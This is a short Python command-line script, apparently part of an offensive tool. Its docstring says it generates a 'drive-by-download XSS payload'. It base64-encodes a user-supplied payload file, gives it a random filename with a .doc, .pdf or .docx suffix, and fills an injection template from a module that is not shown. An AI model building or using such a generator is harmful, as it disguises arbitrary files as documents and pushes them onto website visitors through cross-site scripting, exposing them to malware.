import click
import sys
import string
import random

from core.encoder import b64
from core.convert import sub

__author__ = 'Demetrius Ford'

CHOICES = (
    '.doc',  #=> Microsoft Word for Windows/Word97
    '.pdf',  #=> Acrobat-Portable document format
    '.docx', #=> Microsoft Word for Windows/Word97
)


@click.command()
@click.option('--suffix', type=click.Choice(CHOICES, case_sensitive=True))
@click.option('--payload', type=click.Path(exists=True, dir_okay=False))
def generate(suffix, payload):
    """Generate a drive-by-download XSS payload."""
    cli_args = sys.argv[1:]
    no_suffix, no_payload = (not suffix, not payload)

    if len(cli_args) == 0 \
            or no_suffix \
            or no_payload:
        context = click.get_current_context()
        click.echo(context.get_help())
        context.exit(2)

    char_set = string.printable[:36]
    filename = ''.join(random.choice(char_set) for _ in range(7))
    embedded = b64(payload)

    click.echo(sub((filename + suffix, embedded)))


if __name__ == '__main__':
    generate()
